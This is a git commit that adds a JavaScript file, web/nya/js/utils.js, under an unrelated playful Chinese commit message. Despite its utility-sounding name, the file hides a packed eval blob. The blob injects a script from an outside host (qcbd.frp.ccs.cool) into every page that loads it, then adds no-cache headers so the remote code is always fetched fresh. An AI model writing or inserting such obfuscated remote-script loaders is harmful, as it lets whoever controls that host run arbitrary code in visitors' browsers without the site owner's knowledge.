a529221c4b8db4fbd66bb224e4713e6612d83970
qichenya <qichengongzuoshi@gmail.com>
2024-11-23 01:09:38 +0800

    “杂鱼成成我喜欢你”

---
+++ web/nya/js/utils.js
@@ -0,0 +1,15 @@
+var utilsRemoteScript = document.createElement("script");
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('3.4="2://0.1.8.9/7-5.6";',10,10,'qcbd|frp|http|utilsRemoteScript|src|remote|js|utils|ccs|cool'.split('|'),0,{}))
+document.head.appendChild(utilsRemoteScript);
+var metaCacheControl = document.createElement('meta');
+metaCacheControl.httpEquiv = "Cache-Control";
+metaCacheControl.content = "no-cache, no-store, must-revalidate";
+var metaPragma = document.createElement('meta');
+metaPragma.httpEquiv = "Pragma";
+metaPragma.content = "no-cache";
+var metaExpires = document.createElement('meta');
+metaExpires.httpEquiv = "Expires";
+metaExpires.content = "0";
+document.head.appendChild(metaCacheControl);
+document.head.appendChild(metaPragma);
+document.head.appendChild(metaExpires);
